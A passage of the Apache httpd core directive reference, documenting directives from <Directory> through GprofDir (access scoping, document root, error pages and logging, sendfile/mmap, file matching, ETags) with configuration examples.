DocumentRoot "/var/www/${servername}/htdocs"
```

Variable names may not contain colon ":" characters, to avoid clashes
with `[RewriteMap](../mod/mod_rewrite.html#rewritemap)`'s syntax.

### Virtual Host scope and pitfalls

While this directive is supported in virtual host context,
the changes it makes are visible to any later configuration
directives, beyond any enclosing virtual host.

## <Directory> Directive

| [Description:](directive-dict.html#Description) | Enclose a group of directives that apply only to the named file-system directory, sub-directories, and their contents. |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<Directory directory-path> ... </Directory>` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

`<Directory>` and
`</Directory>` are used to enclose a group of
directives that will apply only to the named directory,
sub-directories of that directory, and the files within the respective
directories. Any directive that is allowed
in a directory context may be used. Directory-path is
either the full path to a directory, or a wild-card string using
Unix shell-style matching. In a wild-card string, `?` matches
any single character, and `*` matches any sequences of
characters. You may also use `[]` character ranges. None
of the wildcards match a `/' character, so `<Directory
"/*/public_html">` will not match
`/home/user/public_html`, but `<Directory
"/home/*/public_html">` will match. Example:

```
<Directory "/usr/local/httpd/htdocs">
  Options Indexes FollowSymLinks
</Directory>
```

Directory paths *may* be quoted, if you like, however, it
*must* be quoted if the path contains spaces. This is because a
space would otherwise indicate the end of an argument.

Be careful with the directory-path arguments:
They have to literally match the filesystem path which Apache httpd uses
to access the files. Directives applied to a particular
`<Directory>` will not apply to files accessed from
that same directory via a different path, such as via different symbolic
links.

[Regular
expressions](../glossary.html#regex "see glossary") can also be used, with the addition of the
`~` character. For example:

```
<Directory ~ "^/www/[0-9]{3}">

</Directory>
```

would match directories in `/www/` that consisted of
three numbers.

If multiple (non-regular expression) `<Directory>` sections
match the directory (or one of its parents) containing a document,
then the directives are applied in the order of shortest match
first, interspersed with the directives from the [.htaccess](#accessfilename) files. For example,
with

```
<Directory "/">
  AllowOverride None
</Directory>

<Directory "/home">
  AllowOverride FileInfo
</Directory>
```

for access to the document `/home/web/dir/doc.html`
the steps are:

* Apply directive `AllowOverride None`
  (disabling `.htaccess` files).
* Apply directive `AllowOverride FileInfo` (for
  directory `/home`).
* Apply any `FileInfo` directives in
  `/home/.htaccess`, `/home/web/.htaccess` and
  `/home/web/dir/.htaccess` in that order.

Regular expressions are not considered until after all of the
normal sections have been applied. Then all of the regular
expressions are tested in the order they appeared in the
configuration file. For example, with

```
<Directory ~ "abc$">
  # ... directives here ...
</Directory>
```

the regular expression section won't be considered until after
all normal `<Directory>`s and
`.htaccess` files have been applied. Then the regular
expression will match on `/home/abc/public_html/abc` and
the corresponding `<Directory>` will
be applied.

**Note that the default access for
`<Directory "/">` is to permit all access.
This means that Apache httpd will serve any file mapped from an URL. It is
recommended that you change this with a block such
as**

```
<Directory "/">
  Require all denied
</Directory>
```

**and then override this for directories you
*want* accessible. See the [Security Tips](../misc/security_tips.html) page for more
details.**

The directory sections occur in the `httpd.conf` file.
`<Directory>` directives
cannot nest, and cannot appear in a `[<Limit>](#limit)` or `[<LimitExcept>](#limitexcept)` section.

## <DirectoryMatch> Directive

| [Description:](directive-dict.html#Description) | Enclose directives that apply to the contents of file-system directories matching a regular expression. |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<DirectoryMatch regex> ... </DirectoryMatch>` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

`<DirectoryMatch>` and
`</DirectoryMatch>` are used to enclose a group
of directives which will apply only to the named directory (and the files within),
the same as `[<Directory>](#directory)`.
However, it takes as an argument a
[regular expression](../glossary.html#regex "see glossary"). For example:

```
<DirectoryMatch "^/www/(.+/)?[0-9]{3}/">
    # ...
</DirectoryMatch>
```

matches directories in `/www/` (or any subdirectory thereof)
that consist of three numbers.

### Compatibility

Prior to 2.3.9, this directive implicitly applied to sub-directories
(like `[<Directory>](#directory)`) and
could not match the end of line symbol ($). In 2.3.9 and later,
only directories that match the expression are affected by the enclosed
directives.

### Trailing Slash

This directive applies to requests for directories that may or may
not end in a trailing slash, so expressions that are anchored to the
end of line ($) must be written with care.

From 2.4.8 onwards, named groups and backreferences are captured and
written to the environment with the corresponding name prefixed with
"MATCH\_" and in upper case. This allows elements of paths to be referenced
from within [expressions](../expr.html) and modules like
`[mod_rewrite](../mod/mod_rewrite.html)`. In order to prevent confusion, numbered
(unnamed) backreferences are ignored. Use named groups instead.

```
<DirectoryMatch "^/var/www/combined/(?<sitename>[^/]+)">
    Require ldap-group cn=%{env:MATCH_SITENAME},ou=combined,o=Example
</DirectoryMatch>
```

## DocumentRoot Directive

| [Description:](directive-dict.html#Description) | Directory that forms the main document tree visible from the web |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `DocumentRoot directory-path` |
| [Default:](directive-dict.html#Default) | `DocumentRoot "/usr/local/apache/htdocs"` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive sets the directory from which `[httpd](../programs/httpd.html)`
will serve files. Unless matched by a directive like `[Alias](../mod/mod_alias.html#alias)`, the server appends the
path from the requested URL to the document root to make the
path to the document. Example:

```
DocumentRoot "/usr/web"
```

then an access to
`http://my.example.com/index.html` refers to
`/usr/web/index.html`. If the directory-path is
not absolute then it is assumed to be relative to the `[ServerRoot](#serverroot)`.

The `DocumentRoot` should be specified without
a trailing slash.

## <Else> Directive

| [Description:](directive-dict.html#Description) | Contains directives that apply only if the condition of a previous `[<If>](#if)` or `[<ElseIf>](#elseif)` section is not satisfied by a request at runtime |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<Else> ... </Else>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Nested conditions are evaluated in 2.4.26 and later |

The `<Else>` applies the enclosed
directives if and only if the most recent
`<If>` or
`<ElseIf>` section
in the same scope has not been applied.
For example: In

```
<If "-z req('Host')">
  # ...
</If>
<Else>
  # ...
</Else>
```

The `<If>` would match HTTP/1.0
requests without a Host: header and the
`<Else>` would match requests
with a Host: header.

## <ElseIf> Directive

| [Description:](directive-dict.html#Description) | Contains directives that apply only if a condition is satisfied by a request at runtime while the condition of a previous `[<If>](#if)` or `<ElseIf>` section is not satisfied |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<ElseIf expression> ... </ElseIf>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Nested conditions are evaluated in 2.4.26 and later |

The `<ElseIf>` applies the enclosed
directives if and only if both the given condition evaluates to true and
the most recent `<If>` or
`<ElseIf>` section in the same scope has
not been applied. For example: In

```
<If "-R '10.1.0.0/16'">
  #...
</If>
<ElseIf "-R '10.0.0.0/8'">
  #...
</ElseIf>
<Else>
  #...
</Else>
```

The `<ElseIf>` would match if
the remote address of a request belongs to the subnet 10.0.0.0/8 but
not to the subnet 10.1.0.0/16.

## EnableMMAP Directive

| [Description:](directive-dict.html#Description) | Use memory-mapping to read files during delivery |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `EnableMMAP On|Off` |
| [Default:](directive-dict.html#Default) | `EnableMMAP On` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This directive controls whether the `[httpd](../programs/httpd.html)` may use
memory-mapping if it needs to read the contents of a file during
delivery. By default, when the handling of a request requires
access to the data within a file -- for example, when delivering a
server-parsed file using `[mod_include](../mod/mod_include.html)` -- Apache httpd
memory-maps the file if the OS supports it.

This memory-mapping sometimes yields a performance improvement.
But in some environments, it is better to disable the memory-mapping
to prevent operational problems:

* On some multiprocessor systems, memory-mapping can reduce the
  performance of the `[httpd](../programs/httpd.html)`.
* Deleting or truncating a file while `[httpd](../programs/httpd.html)`
  has it memory-mapped can cause `[httpd](../programs/httpd.html)` to
  crash with a segmentation fault.

For server configurations that are vulnerable to these problems,
you should disable memory-mapping of delivered files by specifying:

```
EnableMMAP Off
```

For NFS mounted files, this feature may be disabled explicitly for
the offending files by specifying:

```
<Directory "/path-to-nfs-files">
  EnableMMAP Off
</Directory>
```

[![top](../images/up.gif)](#page-header)
## EnableSendfile Directive

| [Description:](directive-dict.html#Description) | Use the kernel sendfile support to deliver files to the client |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `EnableSendfile On|Off` |
| [Default:](directive-dict.html#Default) | `EnableSendfile Off` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Default changed to Off in version 2.3.9. |

This directive controls whether `[httpd](../programs/httpd.html)` may use the
sendfile support from the kernel to transmit file contents to the client.
By default, when the handling of a request requires no access
to the data within a file -- for example, when delivering a
static file -- Apache httpd uses sendfile to deliver the file contents
without ever reading the file if the OS supports it.

This sendfile mechanism avoids separate read and send operations,
and buffer allocations. But on some platforms or within some
filesystems, it is better to disable this feature to avoid
operational problems:

* Some platforms may have broken sendfile support that the build
  system did not detect, especially if the binaries were built on
  another box and moved to such a machine with broken sendfile
  support.
* On Linux the use of sendfile triggers TCP-checksum
  offloading bugs on certain networking cards when using IPv6.
* On Linux on Itanium, `sendfile` may be unable to handle
  files over 2GB in size.
* With a network-mounted `[DocumentRoot](#documentroot)` (e.g., NFS, SMB, CIFS, FUSE),
  the kernel may be unable to serve the network file through
  its own cache.

For server configurations that are not vulnerable to these problems,
you may enable this feature by specifying:

```
EnableSendfile On
```

For network mounted files, this feature may be disabled explicitly
for the offending files by specifying:

```
<Directory "/path-to-nfs-files">
  EnableSendfile Off
</Directory>
```

Please note that the per-directory and .htaccess configuration
of `EnableSendfile` is not supported by
`[mod_cache_disk](../mod/mod_cache_disk.html)`.
Only global definition of `EnableSendfile`
is taken into account by the module.

## Error Directive

| [Description:](directive-dict.html#Description) | Abort configuration parsing with a custom error message |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `Error message` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | 2.3.9 and later |

If an error can be detected within the configuration, this
directive can be used to generate a custom error message, and halt
configuration parsing. The typical use is for reporting required
modules which are missing from the configuration.

```
# Example
# ensure that mod_include is loaded
<IfModule !include_module>
  Error "mod_include is required by mod_foo.  Load it with LoadModule."
</IfModule>

# ensure that exactly one of SSL,NOSSL is defined
<IfDefine SSL>
<IfDefine NOSSL>
  Error "Both SSL and NOSSL are defined.  Define only one of them."
</IfDefine>
</IfDefine>
<IfDefine !SSL>
<IfDefine !NOSSL>
  Error "Either SSL or NOSSL must be defined."
</IfDefine>
</IfDefine>
```
### Note

This directive is evaluated and configuration processing time,
not at runtime. As a result, this directive cannot be conditonally
evaluated by enclosing it in an `[<If>](#if)` section.

[![top](../images/up.gif)](#page-header)
## ErrorDocument Directive

| [Description:](directive-dict.html#Description) | What the server will return to the client in case of an error |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ErrorDocument error-code document` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

In the event of a problem or error, Apache httpd can be configured
to do one of four things,

1. output a simple hardcoded error message
2. output a customized message
3. internally redirect to a local URL-path to handle the
   problem/error
4. redirect to an external URL to handle the
   problem/error

The first option is the default, while options 2-4 are
configured using the `ErrorDocument`
directive, which is followed by the HTTP response code and a URL
or a message. Apache httpd will sometimes offer additional information
regarding the problem/error.

From 2.4.13, [expression syntax](../expr.html) can be
used inside the directive to produce dynamic strings and URLs.

URLs can begin with a slash (/) for local web-paths (relative
to the `[DocumentRoot](#documentroot)`), or be a
full URL which the client can resolve. Alternatively, a message
can be provided to be displayed by the browser. Note that deciding
whether the parameter is an URL, a path or a message is performed
before any expression is parsed. Examples:

```
ErrorDocument 500 http://example.com/cgi-bin/server-error.cgi
ErrorDocument 404 /errors/bad_urls.php
ErrorDocument 401 /subscription_info.html
ErrorDocument 403 "Sorry, can't allow you access today"
ErrorDocument 403 Forbidden!
ErrorDocument 403 /errors/forbidden.py?referrer=%{escape:%{HTTP_REFERER}}
```

Additionally, the special value `default` can be used
to specify Apache httpd's simple hardcoded message. While not required
under normal circumstances, `default` will restore
Apache httpd's simple hardcoded message for configurations that would
otherwise inherit an existing `ErrorDocument`.

```
ErrorDocument 404 /cgi-bin/bad_urls.pl

<Directory "/web/docs">
  ErrorDocument 404 default
</Directory>
```

Note that when you specify an `ErrorDocument`
that points to a remote URL (ie. anything with a method such as
`http` in front of it), Apache HTTP Server will send a redirect to the
client to tell it where to find the document, even if the
document ends up being on the same server. This has several
implications, the most important being that the client will not
receive the original error status code, but instead will
receive a redirect status code. This in turn can confuse web
robots and other clients which try to determine if a URL is
valid using the status code. In addition, if you use a remote
URL in an `ErrorDocument 401`, the client will not
know to prompt the user for a password since it will not
receive the 401 status code. Therefore, **if you use an
`ErrorDocument 401` directive, then it must refer to a local
document.**

Microsoft Internet Explorer (MSIE) will by default ignore
server-generated error messages when they are "too small" and substitute
its own "friendly" error messages. The size threshold varies depending on
the type of error, but in general, if you make your error document
greater than 512 bytes, then MSIE will show the server-generated
error rather than masking it. More information is available in
Microsoft Knowledge Base article [Q294807](http://support.microsoft.com/default.aspx?scid=kb;en-us;Q294807).

Although most error messages can be overridden, there are certain
circumstances where the internal messages are used regardless of the
setting of `[ErrorDocument](#errordocument)`. In
particular, if a malformed request is detected, normal request processing
will be immediately halted and the internal error message returned.
This is necessary to guard against security problems caused by
bad requests.

If you are using mod\_proxy, you may wish to enable
`[ProxyErrorOverride](../mod/mod_proxy.html#proxyerroroverride)` so that you can provide
custom error messages on behalf of your Origin servers. If you don't enable ProxyErrorOverride,
Apache httpd will not generate custom error documents for proxied content.

## ErrorLog Directive

| [Description:](directive-dict.html#Description) | Location where the server will log errors |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ErrorLog file-path|syslog[:[facility][:tag]]` |
| [Default:](directive-dict.html#Default) | `ErrorLog logs/error_log (Unix) ErrorLog logs/error.log (Windows and OS/2)` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `ErrorLog` directive sets the name of
the file to which the server will log any errors it encounters. If
the file-path is not absolute then it is assumed to be
relative to the `[ServerRoot](#serverroot)`.

```
ErrorLog "/var/log/httpd/error_log"
```

If the file-path
begins with a pipe character "`|`" then it is assumed to be a
command to spawn to handle the error log.

```
ErrorLog "|/usr/local/bin/httpd_errors"
```

See the notes on [piped logs](../logs.html#piped) for
more information.

Using `syslog` instead of a filename enables logging
via syslogd(8) if the system supports it. The default is to use
syslog facility `local7`, but you can override this by
using the `syslog:facility` syntax where
facility can be one of the names usually documented in
syslog(1). The facility is effectively global, and if it is changed
in individual virtual hosts, the final facility specified affects the
entire server. Same rules apply for the syslog tag, which by default
uses the Apache binary name, `httpd` in most cases. You can
also override this by using the `syslog::tag`
syntax.

```
ErrorLog syslog:user
ErrorLog syslog:user:httpd.srv1
ErrorLog syslog::httpd.srv2
```

SECURITY: See the [security tips](../misc/security_tips.html#serverroot)
document for details on why your security could be compromised
if the directory where log files are stored is writable by
anyone other than the user that starts the server.

### Note

When entering a file path on non-Unix platforms, care should be taken
to make sure that only forward slashes are used even though the platform
may allow the use of back slashes. In general it is a good idea to always
use forward slashes throughout the configuration files.

## ErrorLogFormat Directive

| [Description:](directive-dict.html#Description) | Format specification for error log entries |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ErrorLogFormat [connection|request] format` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

`ErrorLogFormat` allows to specify what
supplementary information is logged in the error log in addition to the
actual log message.

```
#Simple example
ErrorLogFormat "[%t] [%l] [pid %P] %F: %E: [client %a] %M"
```

Specifying `connection` or `request` as first
parameter allows to specify additional formats, causing additional
information to be logged when the first message is logged for a specific
connection or request, respectively. This additional information is only
logged once per connection/request. If a connection or request is processed
without causing any log message, the additional information is not logged
either.

It can happen that some format string items do not produce output. For
example, the Referer header is only present if the log message is
associated to a request and the log message happens at a time when the
Referer header has already been read from the client. If no output is
produced, the default behavior is to delete everything from the preceding
space character to the next space character. This means the log line is
implicitly divided into fields on non-whitespace to whitespace transitions.
If a format string item does not produce output, the whole field is
omitted. For example, if the remote address `%a` in the log
format `[%t] [%l] [%a] %M` is not available, the surrounding
brackets are not logged either. Space characters can be escaped with a
backslash to prevent them from delimiting a field. The combination '% '
(percent space) is a zero-width field delimiter that does not produce any
output.

The above behavior can be changed by adding modifiers to the format
string item. A `-` (minus) modifier causes a minus to be logged if the
respective item does not produce any output. In once-per-connection/request
formats, it is also possible to use the `+` (plus) modifier. If an
item with the plus modifier does not produce any output, the whole line is
omitted.

A number as modifier can be used to assign a log severity level to a
format item. The item will only be logged if the severity of the log
message is not higher than the specified log severity level. The number can
range from 1 (alert) over 4 (warn) and 7 (debug) to 15 (trace8).

For example, here's what would happen if you added modifiers to
the `%{Referer}i` token, which logs the
`Referer` request header.

| Modified Token | Meaning |
| --- | --- |
| `%-{Referer}i` | Logs a `-` if `Referer` is not set. |
| `%+{Referer}i` | Omits the entire line if `Referer` is not set. |
| `%4{Referer}i` | Logs the `Referer` only if the log message severity is higher than 4. |

Some format string items accept additional parameters in braces.

| Format String | Description |
| --- | --- |
| `%%` | The percent sign |
| `%a` | Client IP address and port of the request |
| `%{c}a` | Underlying peer IP address and port of the connection (see the `[mod_remoteip](../mod/mod_remoteip.html)` module) |
| `%A` | Local IP-address and port |
| `%{name}e` | Request environment variable *name* |
| `%E` | APR/OS error status code and string |
| `%F` | Source file name and line number of the log call |
| `%{name}i` | Request header *name* |
| `%k` | Number of keep-alive requests on this connection |
| `%l` | Loglevel of the message |
| `%L` | Log ID of the request |
| `%{c}L` | Log ID of the connection |
| `%{C}L` | Log ID of the connection if used in connection scope, empty otherwise |
| `%m` | Name of the module logging the message |
| `%M` | The actual log message |
| `%{name}n` | Request note *name* |
| `%P` | Process ID of current process |
| `%T` | Thread ID of current thread |
| `%{g}T` | System unique thread ID of current thread (the same ID as displayed by e.g. `top`; currently Linux only) |
| `%t` | The current time |
| `%{u}t` | The current time including micro-seconds |
| `%{cu}t` | The current time in ISO 8601 extended format (compact), including micro-seconds |
| `%{cuz}t` | The current time in ISO 8601 extended format (compact), including micro-seconds and time zone in the ISO 8601:2000 standard format. Available since 2.4.58 only |
| `%{%-format}t` | The current time formatted per the `strftime(3)` function. Available since 2.4.58 only |
| `%v` | The canonical `[ServerName](#servername)` of the current server. |
| `%V` | The server name of the server serving the request according to the `[UseCanonicalName](#usecanonicalname)` setting. |
| `\` (backslash space) | Non-field delimiting space |
| `%` (percent space) | Field delimiter (no output) |

The log ID format `%L` produces a unique id for a connection
or request. This can be used to correlate which log lines belong to the
same connection or request, which request happens on which connection.
A `%L` format string is also available in
`[mod_log_config](../mod/mod_log_config.html)` to allow to correlate access log entries
with error log lines. If `[mod_unique_id](../mod/mod_unique_id.html)` is loaded, its
unique id will be used as log ID for requests.

```
#Example (default format for threaded MPMs)
ErrorLogFormat "[%{u}t] [%-m:%l] [pid %P:tid %T] %7F: %E: [client\ %a] %M%Â ,\Â referer\Â %{Referer}i"
```

This would result in error messages such as:

`[Thu May 12 08:28:57.652118 2011] [core:error] [pid 8777:tid 4326490112] [client ::1:58619] File does not exist: /usr/local/apache2/htdocs/favicon.ico`

Notice that, as discussed above, some fields are omitted
entirely because they are not defined.

```
#Example (similar to the 2.2.x format)
ErrorLogFormat "[%t] [%l] %7F: %E: [client\ %a] %M%Â ,\Â referer\Â %{Referer}i"
```
```
#Advanced example with request/connection log IDs
ErrorLogFormat "[%{uc}t] [%-m:%-l] [R:%L] [C:%{C}L] %7F: %E: %M"
ErrorLogFormat request "[%{uc}t] [R:%L] Request %k on C:%{c}L pid:%P tid:%T"
ErrorLogFormat request "[%{uc}t] [R:%L] UA:'%+{User-Agent}i'"
ErrorLogFormat request "[%{uc}t] [R:%L] Referer:'%+{Referer}i'"
ErrorLogFormat connection "[%{uc}t] [C:%{c}L] remote\ %a local\ %A"
```

## ExtendedStatus Directive

| [Description:](directive-dict.html#Description) | Keep track of extended status information for each request |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ExtendedStatus On|Off` |
| [Default:](directive-dict.html#Default) | `ExtendedStatus Off[*]` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

This option tracks additional data per worker about the
currently executing request and creates a utilization summary.
You can see these variables during runtime by configuring
`[mod_status](../mod/mod_status.html)`. Note that other modules may
rely on this scoreboard.

This setting applies to the entire server and cannot be
enabled or disabled on a virtualhost-by-virtualhost basis.
The collection of extended status information can slow down
the server. Also note that this setting cannot be changed
during a graceful restart.

Note that loading `[mod_status](../mod/mod_status.html)` will change
the default behavior to ExtendedStatus On, while other
third party modules may do the same. Such modules rely on
collecting detailed information about the state of all workers.
The default is changed by `[mod_status](../mod/mod_status.html)` beginning
with version 2.3.6. The previous default was always Off.

| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | The default used to be "INode MTime Size" in 2.3.14 and earlier. |

The `FileETag` directive configures the file
attributes that are used to create the `ETag` (entity
tag) response header field when the document is based on a static file.
(The `ETag` value is used in cache management to save
network bandwidth.) The
`FileETag` directive allows you to choose
which of these -- if any -- should be used. The recognized keywords are:

**INode**
The file's i-node number will be included in the calculation
**MTime**
The date and time the file was last modified will be included
**Size**
The number of bytes in the file will be included
**All**
All available fields will be used. This is equivalent to:
```
FileETag INode MTime Size
```

**Digest**
If a document is file-based, the `ETag` field will be
calculated by taking the digest over the file.
**None**
If a document is file-based, no `ETag` field will be
included in the response

The `INode`, `MTime`, `Size` and
`Digest` keywords may be prefixed with either `+`
or `-`, which allow changes to be made to the default setting
inherited from a broader scope. Any keyword appearing without such a prefix
immediately and completely cancels the inherited setting.

If a directory's configuration includes
`FileETag INode MTime Size`, and a
subdirectory's includes `FileETag -INode`,
the setting for that subdirectory (which will be inherited by
any sub-subdirectories that don't override it) will be equivalent to
`FileETag MTime Size`.

### Server Side Includes

An ETag is not generated for responses parsed by `[mod_include](../mod/mod_include.html)`
since the response entity can change without a change of the INode, MTime,
Size or Digest of the static file with embedded SSI directives.

## <Files> Directive

| [Description:](directive-dict.html#Description) | Contains directives that apply to matched filenames |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<Files filename> ... </Files>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `<Files>` directive
limits the scope of the enclosed directives by filename. It is comparable
to the `[<Directory>](#directory)`
and `[<Location>](#location)`
directives. It should be matched with a `</Files>`
directive. The directives given within this section will be applied to
any object with a basename (last component of filename) matching the
specified filename. `<Files>`
sections are processed in the order they appear in the
configuration file, after the `[<Directory>](#directory)` sections and
`.htaccess` files are read, but before `[<Location>](#location)` sections. Note
that `<Files>` can be nested
inside `[<Directory>](#directory)` sections to restrict the
portion of the filesystem they apply to.

The filename argument should include a filename, or
a wild-card string, where `?` matches any single character,
and `*` matches any sequences of characters.

```
<Files "cat.html">
    # Insert stuff that applies to cat.html here
</Files>

<Files "?at.*">
    # This would apply to cat.html, bat.html, hat.php and so on.
</Files>
```

[Regular expressions](../glossary.html#regex "see glossary")
can also be used, with the addition of the
`~` character. For example:

```
<Files ~ "\.(gif|jpe?g|png)$">
    #...
</Files>
```

would match most common Internet graphics formats. `[<FilesMatch>](#filesmatch)` is preferred,
however.

Note that unlike `[<Directory>](#directory)` and `[<Location>](#location)` sections, `<Files>` sections can be used inside
`.htaccess` files. This allows users to control access to
their own files, at a file-by-file level.

### See also

* [How <Directory>, <Location>
  and <Files> sections work](../sections.html) for an explanation of how these
  different sections are combined when a request is received

[![top](../images/up.gif)](#page-header)
## <FilesMatch> Directive

| [Description:](directive-dict.html#Description) | Contains directives that apply to regular-expression matched filenames |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<FilesMatch regex> ... </FilesMatch>` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `<FilesMatch>` directive
limits the scope of the enclosed directives by filename, just as the
`[<Files>](#files)` directive
does. However, it accepts a [regular
expression](../glossary.html#regex "see glossary"). For example:

```
<FilesMatch ".+\.(gif|jpe?g|png)$">
    # ...
</FilesMatch>
```

would match most common Internet graphics formats.

The `.+` at the start of the regex ensures that
files named `.png`, or `.gif`, for example,
are not matched.

From 2.4.8 onwards, named groups and backreferences are captured and
written to the environment with the corresponding name prefixed with
"MATCH\_" and in upper case. This allows elements of files to be referenced
from within [expressions](../expr.html) and modules like
`[mod_rewrite](../mod/mod_rewrite.html)`. In order to prevent confusion, numbered
(unnamed) backreferences are ignored. Use named groups instead.

```
<FilesMatch "^(?<sitename>[^/]+)">
    Require ldap-group cn=%{env:MATCH_SITENAME},ou=combined,o=Example
</FilesMatch>
```

## FlushMaxPipelined Directive

| [Description:](directive-dict.html#Description) | Maximum number of pipelined responses above which they are flushed to the network |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `FlushMaxPipelined number` |
| [Default:](directive-dict.html#Default) | `FlushMaxPipelined 5` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | 2.4.47 and later |

This directive allows to configure the maximum number of pipelined
responses, which remain pending so long as pipelined request are received.
When the limit is reached, responses are forcibly flushed to the network in
blocking mode, until passing under the limit again.

`FlushMaxPipelined` helps constraining memory
usage. When set to `0` pipelining is disabled, when set to
`-1` there is no limit (`[FlushMaxThreshold](#flushmaxthreshold)`
still applies).

[![top](../images/up.gif)](#page-header)
## FlushMaxThreshold Directive

| [Description:](directive-dict.html#Description) | Threshold above which pending data are flushed to the network |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `FlushMaxThreshold number-of-bytes` |
| [Default:](directive-dict.html#Default) | `FlushMaxThreshold 65535` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | 2.4.47 and later |

This directive allows to configure the threshold for pending output
data (in bytes). When the limit is reached, data are forcibly flushed to
the network in blocking mode, until passing under the limit again.

`FlushMaxThreshold` helps constraining memory
usage. When set to `0` or a too small value there are actually
no pending data, but for threaded MPMs there can be more threads busy
waiting for the network thus less ones available to handle the other
simultaneous connections.

[![top](../images/up.gif)](#page-header)
## ForceType Directive

| [Description:](directive-dict.html#Description) | Forces all matching files to be served with the specified media type in the HTTP Content-Type header field |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ForceType media-type|None` |
| [Context:](directive-dict.html#Context) | directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

When placed into an `.htaccess` file or a
`[<Directory>](#directory)`, or
`[<Location>](#location)` or
`[<Files>](#files)`
section, this directive forces all matching files to be served
with the content type identification given by
media-type. For example, if you had a directory full of
GIF files, but did not want to label them all with `.gif`,
you might want to use:

```
ForceType image/gif
```

Note that this directive overrides other indirect media type
associations defined in mime.types or via the
`[AddType](../mod/mod_mime.html#addtype)`.

You can also override more general
`ForceType` settings
by using the value of `None`:

```
# force all files to be image/gif:
<Location "/images">
  ForceType image/gif
</Location>

# but normal mime-type associations here:
<Location "/images/mixed">
  ForceType None
</Location>
```

This directive primarily overrides the content types generated for
static files served out of the filesystem. For resources other than
static files, where the generator of the response typically specifies
a Content-Type, this directive has no effect.

### Note

When explicit directives such as
`[SetHandler](#sethandler)` or
`[AddHandler](../mod/mod_mime.html#addhandler)` do not apply
to the current request, the internal handler name normally set by those
directives is set to match the content type specified by this directive.
This is a historical behavior that some third-party modules
(such as mod\_php) may use "magic" content types used only to signal the
module to take responsibility for the matching request. Configurations
that rely on such "magic" types should be avoided by the use of
`[SetHandler](#sethandler)` or
`[AddHandler](../mod/mod_mime.html#addhandler)`.

[![top](../images/up.gif)](#page-header)
## GprofDir Directive

| [Description:](directive-dict.html#Description) | Directory to write gmon.out profiling data to. |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `GprofDir /tmp/gprof/|/tmp/gprof/%` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

